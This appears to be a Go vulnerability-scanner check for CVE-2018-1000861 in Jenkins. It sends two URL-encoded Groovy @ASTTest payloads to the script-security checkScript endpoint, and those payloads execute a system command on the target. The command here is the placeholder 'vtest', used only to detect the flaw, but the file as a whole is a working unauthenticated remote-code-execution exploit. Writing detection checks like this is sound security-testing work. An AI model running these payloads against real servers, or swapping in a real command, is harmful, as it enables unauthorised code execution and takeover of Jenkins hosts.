package jenkins

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

func CVE_2018_1000861(u string, client *httpx.Client) bool {
	if req, err := client.Request(u, "GET", "", nil, "Poc Jenkins"); err == nil {
		if req.RespHeader.Get("X-Jenkins-Session") != "" {
			if req2, err := client.Request(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22vtest%22)%7d)%0aclass+Person%7b%7d", "POST", "", nil, "Poc Jenkins"); err == nil {
				if req2.StatusCode == 500 && strings.Contains(req2.Body, "No such file or directory") {
					return true
				}
			}
			if req3, err := client.Request(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22vtest%22.execute().text+%7d)%0aclass+Person%7b%7d", "POST", "", nil, "Poc Jenkins"); err == nil {
				if req3.StatusCode == 500 && strings.Contains(req3.Body, "No such file or directory") {
					return true
				}
			}
		}
	}
	return false
}
